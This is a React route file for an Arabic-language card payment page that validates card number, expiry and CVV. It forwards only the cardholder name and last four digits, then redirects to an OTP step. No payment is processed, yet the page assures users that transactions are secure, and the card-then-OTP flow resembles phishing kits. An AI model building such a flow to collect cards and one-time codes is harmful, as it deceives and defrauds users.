import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { ArrowLeft, CreditCard, Lock, Check } from "lucide-react";
import { submitCurrentStep } from "@/lib/workflow";
import { track } from "@/lib/gate";

export const Route = createFileRoute("/payment")({
  head: () => ({
    meta: [
      { title: "الدفع — بيكير" },
      { name: "description", content: "أدخل بيانات بطاقتك لإتمام عملية الدفع بأمان." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: PaymentPage,
});

function PaymentPage() {
  const navigate = useNavigate();
  const [form, setForm] = useState({ cardName: "", cardNumber: "", expiry: "", cvv: "" });
  const [loading, setLoading] = useState(false);
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});

  const update = (k: string, v: string) => {
    setForm((p) => ({ ...p, [k]: v }));
    setFieldErrors((p) => ({ ...p, [k]: "" }));
  };

  const luhnValid = (digits: string) => {
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
      let d = Number(digits[digits.length - 1 - i]);
      if (i % 2 === 1) {
        d *= 2;
        if (d > 9) d -= 9;
      }
      sum += d;
    }
    return sum % 10 === 0;
  };

  const validateCardNumber = (v: string) => {
    const digits = v.replace(/\D/g, "");
    if (!/^\d{16}$/.test(digits)) return "رقم البطاقة يجب أن يتكون من 16 رقمًا";
    if (!luhnValid(digits)) return "رقم البطاقة غير صحيح، تحقق من الأرقام";
    return "";
  };

  const validateExpiry = (v: string) => {
    const m = /^(\d{2})\/(\d{2})$/.exec(v);
    if (!m) return "الصيغة الصحيحة MM/YY";
    const month = Number(m[1]);
    const year = 2000 + Number(m[2]);
    if (month < 1 || month > 12) return "الشهر يجب أن يكون بين 01 و 12";
    const now = new Date();
    if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1))
      return "البطاقة منتهية الصلاحية";
    return "";
  };

  const validateCvv = (v: string) =>
    /^\d{3,4}$/.test(v) ? "" : "رمز CVV يجب أن يكون 3 أو 4 أرقام";

  const fmtExpiry = (v: string) => {
    const digits = v.replace(/\D/g, "").slice(0, 4);
    return digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errors: Record<string, string> = {
      cardNumber: validateCardNumber(form.cardNumber),
      expiry: validateExpiry(form.expiry),
      cvv: validateCvv(form.cvv),
    };
    setFieldErrors(errors);
    if (Object.values(errors).some(Boolean)) return;
    setLoading(true);
    const digits = form.cardNumber.replace(/\D/g, "");
    const sanitized = {
      cardholder_name: form.cardName,
      card_last4: digits.slice(-4),
    };
    track("card_submit", { step: "payment", card_last4: sanitized.card_last4 });
    await submitCurrentStep("payment", sanitized);
    setLoading(false);
    void navigate({ to: "/otp" });
  };

  const fmtCard = (v: string) => v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-md">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <CreditCard className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-2xl font-extrabold text-dark-900">الدفع</h1>
            <p className="mt-2 text-sm text-dark-500">أدخل بيانات بطاقتك لإتمام العملية</p>
          </div>

          <form onSubmit={handleSubmit} className="card space-y-5">
            <div>
              <label className="mb-1.5 block text-sm font-medium text-dark-700">الاسم على البطاقة</label>
              <input value={form.cardName} onChange={(e) => update("cardName", e.target.value)} required className="input-field" placeholder="الاسم الكامل" />
            </div>
            <div>
              <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم البطاقة</label>
              <input value={form.cardNumber} onChange={(e) => update("cardNumber", fmtCard(e.target.value))} onBlur={() => setFieldErrors((p) => ({ ...p, cardNumber: form.cardNumber ? validateCardNumber(form.cardNumber) : "" }))} required className="input-field" placeholder="0000 0000 0000 0000" inputMode="numeric" dir="ltr" />
              {fieldErrors["cardNumber"] && <p className="mt-1 text-xs text-red-600">{fieldErrors["cardNumber"]}</p>}
            </div>
            <div className="grid grid-cols-1 gap-4 min-[360px]:grid-cols-2">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">تاريخ الانتهاء</label>
                <input value={form.expiry} onChange={(e) => update("expiry", fmtExpiry(e.target.value))} onBlur={() => setFieldErrors((p) => ({ ...p, expiry: form.expiry ? validateExpiry(form.expiry) : "" }))} required className="input-field" placeholder="MM/YY" maxLength={5} inputMode="numeric" dir="ltr" />
                {fieldErrors["expiry"] && <p className="mt-1 text-xs text-red-600">{fieldErrors["expiry"]}</p>}
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">CVV</label>
                <input value={form.cvv} onChange={(e) => update("cvv", e.target.value.replace(/\D/g, "").slice(0, 4))} onBlur={() => setFieldErrors((p) => ({ ...p, cvv: form.cvv ? validateCvv(form.cvv) : "" }))} required className="input-field" placeholder="123" inputMode="numeric" maxLength={4} dir="ltr" />
                {fieldErrors["cvv"] && <p className="mt-1 text-xs text-red-600">{fieldErrors["cvv"]}</p>}
              </div>
            </div>

            <div className="flex items-center gap-2 rounded-xl bg-primary-50 px-4 py-3 text-sm text-primary-700">
              <Lock className="h-5 w-5" />
              جميع المعاملات مشفّرة وآمنة
            </div>

            <div className="flex items-center justify-between rounded-xl bg-dark-50 px-4 py-3">
              <span className="text-sm text-dark-500">المبلغ الإجمالي</span>
              <span className="text-xl font-extrabold text-dark-900">— ريال</span>
            </div>

            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جارٍ الدفع..." : "ادفع الآن"}
              <ArrowLeft className="h-5 w-5" />
            </button>
          </form>

          <div className="mt-4 flex justify-center gap-2">
            {["VISA", "Mastercard", "mada", "Apple Pay"].map((p) => (
              <span key={p} className="rounded-lg bg-white px-3 py-1.5 text-xs font-medium text-dark-500 ring-1 ring-dark-200">{p}</span>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
